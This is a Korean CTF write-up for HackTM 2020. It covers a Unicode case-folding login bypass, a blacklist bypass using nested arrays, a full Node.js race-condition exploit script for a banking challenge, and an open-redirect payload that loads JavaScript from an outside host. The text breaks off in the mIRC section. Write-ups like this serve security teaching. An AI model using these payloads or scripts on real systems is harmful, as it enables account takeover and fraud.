<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;956WreckTheLine 팀에서 주최한 CTF 입니다.[175pts] Draw with us (1st solve)stripped.jsCome draw with us!http:&#x2F;&#x2F;167.172.165.153:60000&#x2F;Author: stackolaHint! Changing your color is the fi"><meta property="og:type" content="article"><meta property="og:title" content="HackTM CTF Quals 2020"><meta property="og:url" content="https://blog.p6.is/hacktm-ctf-quals-2020/index.html"><meta property="og:site_name" content="POSIX"><meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;956WreckTheLine 팀에서 주최한 CTF 입니다.[175pts] Draw with us (1st solve)stripped.jsCome draw with us!http:&#x2F;&#x2F;167.172.165.153:60000&#x2F;Author: stackolaHint! Changing your color is the fi"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2020-02-03T00:00:00.000Z"><meta property="article:modified_time" content="2020-02-23T19:05:34.000Z"><meta property="article:author" content="posix"><meta property="article:tag" content="HackTM CTF"><meta name="twitter:card" content="summary"><link rel="shortcut icon" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=16"><link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=192" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=180"><title>HackTM CTF Quals 2020</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/rtl.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="POSIX" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fas fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul></ul></span><br><span id="actions"><ul><li><a class="icon" href="/xss-shift-js-solution/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" href="/drive-net-crlf-injection/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/hacktm-ctf-quals-2020/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/hacktm-ctf-quals-2020/&text=HackTM CTF Quals 2020"><i class="fab fa-twitter" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#175pts-Draw-with-us-1st-solve"><span class="toc-number">1.</span> <span class="toc-text">[175pts] Draw with us (1st solve)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#280pts-My-Bank"><span class="toc-number">2.</span> <span class="toc-text">[280pts] My Bank</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#497pts-mIRC-3rd-solve"><span class="toc-number">3.</span> <span class="toc-text">[497pts] mIRC (3rd solve)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#497pts-Humans-of-Dancers-4th-solve"><span class="toc-number">4.</span> <span class="toc-text">[497pts] Humans of Dancers (4th solve)</span></a></li></ol></div></span></div><div class="content index py4"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">HackTM CTF Quals 2020</h1><div class="meta"><span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">POSIX</span></span><div class="postdate">&nbsp;<time datetime="2020-02-03T00:00:00.000Z" itemprop="datePublished">2020-02-03</time></div>&nbsp;<div class="article-category">&nbsp;<i class="fas fa-archive"></i> <a class="category-link" href="/category/writeup/">Writeup</a></div>&nbsp;<div class="article-tag">&nbsp;<i class="fas fa-tag"></i> <a class="tag-link-link" href="/tags/HackTM-CTF/" rel="tag">HackTM CTF</a></div>&nbsp;</div></header><div class="content" itemprop="articleBody"><ul><li><a href="https://ctftime.org/event/956" target="_blank" rel="noopener">https://ctftime.org/event/956</a></li></ul><p>WreckTheLine 팀에서 주최한 CTF 입니다.</p><h2 id="175pts-Draw-with-us-1st-solve"><a href="#175pts-Draw-with-us-1st-solve" class="headerlink" title="[175pts] Draw with us (1st solve)"></a>[175pts] <a href="#draw-with-us">Draw with us</a> (1st solve)</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/hacktm/stripped.js" target="_blank" rel="noopener">stripped.js</a></li></ul><blockquote><p>Come draw with us!<br><a href="http://167.172.165.153:60000/" target="_blank" rel="noopener">http://167.172.165.153:60000/</a><br>Author: stackola<br><strong>Hint!</strong> Changing your color is the first step towards happiness.</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidUser</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    u.username.length &gt;= <span class="number">3</span> &amp;&amp;</span><br><span class="line">    u.username.toUpperCase() !== config.adminUsername.toUpperCase()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>로그인 함수에서 <code>isValidUser</code> 함수를 호출하여 admin 계정으로의 로그인인지 확인합니다.<br><code>u.username.toUpperCase() !== config.adminUsername.toUpperCase()</code> 를 만족하지 않으면 로그인인 가능합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> u.username.toLowerCase() == config.adminUsername.toLowerCase();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>하지만 로그인 이후 관리자 페이지인 <code>/updateUser</code> 에서는 <code>isAdmin</code> 함수를 이용하여 관리자 권한을 확인하는데, 비교에 <code>String.toUpperCase</code> 를 사용하였던 <code>isValidUser</code> 와 다르게 <code>String.toLowerCase</code> 를 사용하고 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[223] ß (%C3%9F).toUpperCase() &#x3D;&gt; SS (%53%53)</span><br><span class="line">[304] İ (%C4%B0).toLowerCase() &#x3D;&gt; i̇ (%69%307)</span><br><span class="line">[305] ı (%C4%B1).toUpperCase() &#x3D;&gt; I (%49)</span><br><span class="line">[329] ŉ (%C5%89).toUpperCase() &#x3D;&gt; ʼN (%2bc%4e)</span><br><span class="line">[383] ſ (%C5%BF).toUpperCase() &#x3D;&gt; S (%53)</span><br><span class="line">[496] ǰ (%C7%B0).toUpperCase() &#x3D;&gt; J̌ (%4a%30c)</span><br><span class="line">[7830] ẖ (%E1%BA%96).toUpperCase() &#x3D;&gt; H̱ (%48%331)</span><br><span class="line">[7831] ẗ (%E1%BA%97).toUpperCase() &#x3D;&gt; T̈ (%54%308)</span><br><span class="line">[7832] ẘ (%E1%BA%98).toUpperCase() &#x3D;&gt; W̊ (%57%30a)</span><br><span class="line">[7833] ẙ (%E1%BA%99).toUpperCase() &#x3D;&gt; Y̊ (%59%30a)</span><br><span class="line">[7834] ẚ (%E1%BA%9A).toUpperCase() &#x3D;&gt; Aʾ (%41%2be)</span><br><span class="line">[8490] K (%E2%84%AA).toLowerCase() &#x3D;&gt; k (%6b)</span><br><span class="line">[64256] ﬀ (%EF%AC%80).toUpperCase() &#x3D;&gt; FF (%46%46)</span><br><span class="line">[64257] ﬁ (%EF%AC%81).toUpperCase() &#x3D;&gt; FI (%46%49)</span><br><span class="line">[64258] ﬂ (%EF%AC%82).toUpperCase() &#x3D;&gt; FL (%46%4c)</span><br><span class="line">[64259] ﬃ (%EF%AC%83).toUpperCase() &#x3D;&gt; FFI (%46%46%49)</span><br><span class="line">[64260] ﬄ (%EF%AC%84).toUpperCase() &#x3D;&gt; FFL (%46%46%4c)</span><br><span class="line">[64261] ﬅ (%EF%AC%85).toUpperCase() &#x3D;&gt; ST (%53%54)</span><br><span class="line">[64262] ﬆ (%EF%AC%86).toUpperCase() &#x3D;&gt; ST (%53%54)</span><br></pre></td></tr></table></figure><p>자바스크립트에서 <code>K(U+212a)</code> 는 <code>String.toLowerCase</code> 함수를 통해, 아스키 문자인 <code>k(0x6b)</code> 로 변환됩니다. 따라서 <code>{&quot;username&quot;:&quot;hac\u212aTm&quot;}</code> 를 파라미터로 하여 로그인하면, <code>isValidUser</code> 함수를 우회하고 관리자 페이지인 <code>/updateUser</code> 에 접근할 수 있게 됩니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">"/flag"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Get the flag</span></span><br><span class="line">  <span class="comment">// Only for root</span></span><br><span class="line">  <span class="keyword">if</span> (req.user.id == <span class="number">0</span>) &#123;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">flag</span>: flag &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.send(err(<span class="string">"Unauthorized"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>플래그를 얻기 위해서는 <code>/flag</code> 경로에 접근할 수 있어야 하는데, <code>req.user.id</code> 값을 <code>0</code> 으로 만들어야 합니다. 이 값은 <code>/init</code> 페이지에서 변경할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">"/init"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123; p = <span class="string">"0"</span>, q = <span class="string">"0"</span>, clearPIN &#125; = req.body;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> target = md5(config.n.toString());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> pwHash = md5(</span><br><span class="line">    bigInt(<span class="built_in">String</span>(p))</span><br><span class="line">      .multiply(<span class="built_in">String</span>(q))</span><br><span class="line">      .toString()</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pwHash == target &amp;&amp; clearPIN === _clearPIN) &#123;</span><br><span class="line">    <span class="comment">// Clear the board</span></span><br><span class="line">    board = <span class="keyword">new</span> <span class="built_in">Array</span>(config.height)</span><br><span class="line">      .fill(<span class="number">0</span>)</span><br><span class="line">      .map(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Array</span>(config.width).fill(config.backgroundColor));</span><br><span class="line">    boardString = boardToStrings();</span><br><span class="line"></span><br><span class="line">    io.emit(<span class="string">"board"</span>, &#123; <span class="attr">board</span>: boardString &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Sign the admin ID</span></span><br><span class="line">  <span class="keyword">let</span> adminId = pwHash</span><br><span class="line">    .split(<span class="string">""</span>)</span><br><span class="line">    .map(<span class="function">(<span class="params">c, i</span>) =&gt;</span> c.charCodeAt(<span class="number">0</span>) ^ target.charCodeAt(i))</span><br><span class="line">    .reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(adminId);</span><br><span class="line"></span><br><span class="line">  res.json(ok(&#123; <span class="attr">token</span>: sign(&#123; <span class="attr">id</span>: adminId &#125;) &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>/init</code> 에서는 <code>sign</code> 함수를 통해 <code>req.users.id</code> 값을 변경할 수 있습니다.<br>그러기 위해서는 <code>pwHash</code> 값인 <code>md5(bigInt(String(p)).multiply(String(q)).toString())</code> 와 <code>target</code> 인 <code>md5(config.n.toString())</code> 값이 동일해야만 합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">"/serverInfo"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Get server info</span></span><br><span class="line">  <span class="comment">// Only for logged in users</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> user = users[req.user.id] || &#123; <span class="attr">rights</span>: [] &#125;;</span><br><span class="line">  <span class="keyword">let</span> info = user.rights.map(<span class="function"><span class="params">i</span> =&gt;</span> (&#123; <span class="attr">name</span>: i, <span class="attr">value</span>: config[i] &#125;));</span><br><span class="line">  res.json(ok(&#123; <span class="attr">info</span>: info &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>config.n</code> 값은 <code>/serverInfo</code> 에서 알아낼 수 있습니다.<br><code>user.rights.map</code> 함수를 통하여 config[n] 값을 반환하도록 할 수 있는 가능성을 제공합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">"/updateUser"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">let</span> rights = req.body.rights || [];</span><br><span class="line">  <span class="keyword">if</span> (rights.length &gt; <span class="number">0</span> &amp;&amp; checkRights(rights)) &#123;</span><br><span class="line">    users[uid].rights = user.rights.concat(rights).filter(onlyUnique);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkRights</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> blacklist = [<span class="string">"p"</span>, <span class="string">"n"</span>, <span class="string">"port"</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = arr[i];</span><br><span class="line">    <span class="keyword">if</span> (blacklist.includes(element)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>따라서 위에서 설명했던 <code>/updateUser</code> 페이지를 통해 <code>user.rights</code> 에서 <code>n</code> 값을 넣어주면 되는데<br><code>checkRights</code> 함수에서 <code>blacklist.includes</code> 를 통해 <code>p</code>, <code>n</code>, <code>post</code> 등의 문자열 값이 입력으로 들어올 경우 거부됩니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A = &#123;<span class="string">'key'</span>: <span class="string">'value'</span>&#125;</span><br><span class="line"><span class="comment">// &#123;key: "value"&#125;</span></span><br><span class="line">A[<span class="string">'key'</span>]</span><br><span class="line"><span class="comment">// "value"</span></span><br><span class="line">A[[<span class="string">'key'</span>]]</span><br><span class="line"><span class="comment">// "value"</span></span><br></pre></td></tr></table></figure><p>자바스크립트에서는 첨자를 사용하여 객체를 참조할 때, 키 값으로 문자열 이외의 값이 들어올 경우, 원시 타입으로 변환하여 키로 사용합니다.<br>따라서 <code>checkRights</code> 함수에서 입력으로 <code>{&quot;rights&quot;:[[&quot;n&quot;]]}</code> 과 같은 배열을 넣어줄 경우에, <code>blacklist.includes</code> 를 우회하여 <code>/serverInfo</code> 애서 <code>config.n</code> 값을 확인하도록 할 수 있습니다.</p><p>이후 <code>/init</code> 에서 <code>q</code> 값을 <code>1</code>으로, <code>p</code> 값으로 알아낸 <code>config.n</code> 값을 넣어주면 <code>req.user.id</code> 값을 0으로 만들 수 있고, <code>/flag</code> 에서 플래그를 확인할 수 있습니다.</p><h2 id="280pts-My-Bank"><a href="#280pts-My-Bank" class="headerlink" title="[280pts] My Bank"></a>[280pts] <a href="#my-bank">My Bank</a></h2><blockquote><p>Who’s got my money?<br>Please abstain from brute-forcing files.<br><a href="http://178.128.175.6:50090/" target="_blank" rel="noopener">http://178.128.175.6:50090/</a><br>Author: nytr0gen</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exploit.js</span></span><br><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">'request'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solve</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    request(<span class="string">'http://178.128.175.6:50090/register'</span>, (err, res, body) =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> cookie = res.headers[<span class="string">'set-cookie'</span>][<span class="number">0</span>].split(<span class="string">';'</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">let</span> token = <span class="regexp">/csrf_token.+value="([^"]+)"/</span>.exec(body)[<span class="number">1</span>];</span><br><span class="line">        request(<span class="string">'http://178.128.175.6:50090/register'</span>, &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"POST"</span>,</span><br><span class="line">            <span class="string">"headers"</span>: &#123;</span><br><span class="line">                <span class="string">"Cookie"</span>: cookie,</span><br><span class="line">                <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"body"</span>: <span class="string">"csrf_token="</span> + token + <span class="string">"&amp;username=posix"</span></span><br><span class="line">        &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">            <span class="keyword">let</span> cookie = res.headers[<span class="string">'set-cookie'</span>][<span class="number">0</span>].split(<span class="string">';'</span>)[<span class="number">0</span>];</span><br><span class="line">            request(<span class="string">'http://178.128.175.6:50090/'</span>, &#123;</span><br><span class="line">                <span class="string">"headers"</span>: &#123;</span><br><span class="line">                    <span class="string">"Cookie"</span>: cookie</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,(err, res, body) =&gt; &#123;</span><br><span class="line">                <span class="keyword">let</span> token = <span class="regexp">/csrf_token.+value="([^"]+)"/</span>.exec(body)[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">let</span> cookie = res.headers[<span class="string">'set-cookie'</span>][<span class="number">0</span>].split(<span class="string">';'</span>)[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">let</span> queue = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; ++i) &#123;</span><br><span class="line">                    queue += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">                    request(<span class="string">'http://178.128.175.6:50090/'</span>, &#123;</span><br><span class="line">                        <span class="string">"method"</span>: <span class="string">"POST"</span>,</span><br><span class="line">                        <span class="string">"headers"</span>: &#123;</span><br><span class="line">                            <span class="string">"Cookie"</span>: cookie,</span><br><span class="line">                            <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="string">"body"</span>: <span class="string">"csrf_token="</span> + token + <span class="string">"&amp;loan=100"</span></span><br><span class="line">                    &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">                        queue -= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (queue === <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">let</span> cookie = res.headers[<span class="string">'set-cookie'</span>][<span class="number">0</span>].split(<span class="string">';'</span>)[<span class="number">0</span>];</span><br><span class="line">                            request(<span class="string">'http://178.128.175.6:50090/'</span>, &#123;</span><br><span class="line">                                <span class="string">"headers"</span>: &#123;</span><br><span class="line">                                    <span class="string">"Cookie"</span>: cookie</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">                                <span class="keyword">let</span> money = <span class="regexp">/Money: ([^ ]+)/</span>.exec(body)[<span class="number">1</span>];</span><br><span class="line">                                money = <span class="built_in">parseInt</span>(money.replace(<span class="regexp">/,/g</span>, <span class="string">''</span>))</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> (money &gt;= <span class="number">1400</span>) &#123;</span><br><span class="line">                                    get_flag(cookie);</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="built_in">console</span>.log(<span class="string">'[*] Trying, Got '</span> + money);</span><br><span class="line">                                    solve();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params">cookie</span>) </span>&#123;</span><br><span class="line">    request(<span class="string">'http://178.128.175.6:50090/store'</span>, &#123;</span><br><span class="line">        <span class="string">"headers"</span>: &#123;</span><br><span class="line">            <span class="string">"Cookie"</span>: cookie</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> token = <span class="regexp">/csrf_token.+value="([^"]+)"/</span>.exec(body)[<span class="number">1</span>];</span><br><span class="line">        request(<span class="string">'http://178.128.175.6:50090/store'</span>, &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"POST"</span>,</span><br><span class="line">            <span class="string">"headers"</span>: &#123;</span><br><span class="line">                <span class="string">"Cookie"</span>: cookie,</span><br><span class="line">                <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"body"</span>: <span class="string">"csrf_token="</span> + token + <span class="string">"&amp;item=1337"</span></span><br><span class="line">        &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">            <span class="keyword">let</span> cookie = res.headers[<span class="string">'set-cookie'</span>][<span class="number">0</span>].split(<span class="string">';'</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">            request(<span class="string">'http://178.128.175.6:50090/store'</span>, &#123;</span><br><span class="line">                <span class="string">"headers"</span>: &#123;</span><br><span class="line">                    <span class="string">"Cookie"</span>: cookie</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">                <span class="keyword">let</span> flag = <span class="regexp">/HackTM&#123;.*&#125;/</span>.exec(body)[<span class="number">0</span>];</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"[!] flag is "</span> + flag);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">solve();</span><br></pre></td></tr></table></figure><p>레이스 컨디션 취약점을 통해 <code>600.00 tBTC</code> 이상의 돈을 빌릴 수 있습니다.<br>이후 <code>/store</code> 에서 플래그를 구입하면 됩니다.</p><h2 id="497pts-mIRC-3rd-solve"><a href="#497pts-mIRC-3rd-solve" class="headerlink" title="[497pts] mIRC (3rd solve)"></a>[497pts] <a href="#mirc">mIRC</a> (3rd solve)</h2><blockquote><p>The new Yahoo! Messenger. Dirbuster will not help you with anything. The admin should be talkative.<br><a href="http://178.128.175.6:40080/" target="_blank" rel="noopener">http://178.128.175.6:40080/</a><br>Author: nytr0gen</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;178.128.175.6:40080&#x2F;login?next&#x3D;http:&#x2F;&#x2F;rwx.kr&#x2F;1.js</span><br><span class="line">&#x2F;&#x2F; if logged in, redirect to (http:&#x2F;&#x2F;rwx.kr&#x2F;1.js)</span><br><span class="line"></span><br><span class="line">POST &#x2F;register HTTP&#x2F;1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">csrf_token&#x3D;&lt;token&gt;&amp;username&#x3D;..&#x2F;..&#x2F;login?next&#x3D;http:&#x2F;&#x2F;rwx.kr&#x2F;1.js?x&#x3D;?&amp;password&#x3D;123</span><br></pre></td></tr></table></figure><p><code>http://178.128.175.6:40080/login?next=http://attacker.com</code> 의 <code>open redirection</code> 취약점이 존재하고 로그인 시, 유저명에 url 을 입력할 수 있습니다.</p><figure class="highlight html"><table><tr><td 